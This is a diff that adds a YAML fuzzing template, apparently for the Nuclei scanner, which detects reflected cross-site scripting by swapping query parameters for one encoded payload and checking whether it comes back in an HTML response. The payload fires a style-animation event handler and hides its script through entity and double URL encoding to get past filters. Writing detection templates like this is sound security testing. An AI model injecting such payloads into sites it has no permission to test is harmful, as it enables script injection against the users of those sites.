@@ -1,0 +1,39 @@
+id: fuzz-reflection-xss-custom-2
+
+info:
+  name: Custom Reflection XSS Detection - Style Payload
+  author: netbaan
+  severity: low
+  description: |
+    This template is designed to detect reflection XSS vulnerabilities using a specified style-based payload.
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'  # Run only on GET requests
+
+    payloads:
+      xss:
+        - "<style>@KeyFrames z{</style><div style=animation-name:z onanimationend=&#97&#108&#101&#114&#116&grave;1&grave;> %253Cscript%253Ealert('XSS')%253C%252Fscript%253E"
+
+    stop-at-first-match: true
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{xss}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{xss}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
